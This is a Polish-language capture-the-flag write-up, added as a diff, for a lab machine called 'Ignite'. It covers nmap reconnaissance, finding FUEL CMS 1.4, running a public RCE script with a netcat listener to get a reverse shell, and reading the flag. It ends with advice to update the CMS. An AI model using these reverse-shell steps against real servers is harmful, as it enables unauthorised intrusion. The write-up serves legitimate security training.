@@ -1,0 +1,65 @@
+# Ignite
+Hacker:hubert
+
+Cel: Zidentyfikuj podatność i uzyskaj dostęp do systemu. Znajdź flagę w pliku /home/user/flag.txt
+
+IP:10.10.163.133
+
+Zasady:
+- Możesz używać nmap, gobuster, nikto, Burp Suite, przeglądarki itp.
+
+- Zakładamy, że maszyna nie ma AV ani firewalli – skupiamy się na logice ataku.
+
+- Nie masz pełnego dostępu — masz się włamać.
+
+## Rekonesans
+Znaleziony port 80 (HTTP) z wersja Apache 2.4.18 z dostepnym plikiem robots.txt ktory zawiera /fuel/ 
+
+System operacyjny maszyny to Linux 
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-title: Welcome to FUEL CMS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.4 (97%), Linux 5.4 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (96%), Linux 3.2 - 4.14 (96%), Linux 3.10 - 3.13 (96%), Linux 4.15 (95%), Linux 4.15 - 5.19 (95%), Linux 2.6.32 - 3.10 (95%), Linux 3.10 - 4.11 (94%), Linux 3.13 (93%)
+No exact OS matches for host (test conditions non-ideal).
+
+## Odkrycie podatnosci
+Na stronie http://10.10.163.133 widnieje napis “Version 1.4” wiec wpisalem w przegladarke “Fuel cms 1.4 exploit”
+
+Znaleziona podatnosc to RCE https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated
+
+Podatnosc ta pozwala na RCE backdoora na server i wtedy otrzymujemy shell
+
+
+
+## Exploitacja
+1. Pobranie exploita https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated
+2. Wpisanie komendy ‘python3 ~/Desktop/Fuel-Updated.py http://10.10.163.133 10.8.8.207 4444’ (python3 Fuel-Updated.py <ADRES_STRONY> <TWOJE IP> <PORT>)
+3. Przed wpisaniem komendy w punkcie 2 nalezy w drugim terminalu wpisac “nc -lvnp <PORT>(w moim przypadku 4444)” aby otrzymac powloke
+4. Otrzymujemy powloke
+
+## Dowod
+┌──(hubert㉿kali)-[~]
+└─$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.8.8.207] from (UNKNOWN) [10.10.163.133] 58920
+sh: 0: can't access tty; job control turned off
+$ cd /home
+$ ls
+www-data
+$ pwd
+/home
+$ cd www-data
+$ ls
+flag.txt
+$ cat flag.txt
+6470e394cbf6dab6a91682cc8585059b
+
+## Wnioski
+1. Jaknajszybsza aktualizacja wersji cms'a
+2. Ewentualna zmiana na inny CMS
+
